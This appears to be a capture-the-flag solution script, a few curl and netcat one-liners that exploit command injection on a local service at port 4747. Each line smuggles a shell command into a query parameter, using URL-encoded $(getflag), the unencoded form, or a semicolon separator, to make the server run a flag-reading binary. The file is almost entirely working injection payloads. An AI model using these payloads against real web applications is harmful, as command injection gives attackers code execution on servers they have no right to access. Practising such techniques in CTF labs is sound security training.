
# URL encoder
# https://www.urlencoder.org/

# %24%28getflag%29 == URL-encoded $(getflag)

# As simple as that
curl http://localhost:4747?x=%24%28getflag%29

# Or with nc
echo -e "GET /?x=%24%28getflag%29 HTTP/1.1\nHost:localhost\n\n" | nc localhost 4747

# Without encoding
echo -e 'GET /?x=$(getflag) HTTP/1.1\nHost:localhost\n\n' | nc localhost 4747

# Using separation
curl http://localhost:4747?x=%3Bgetflag
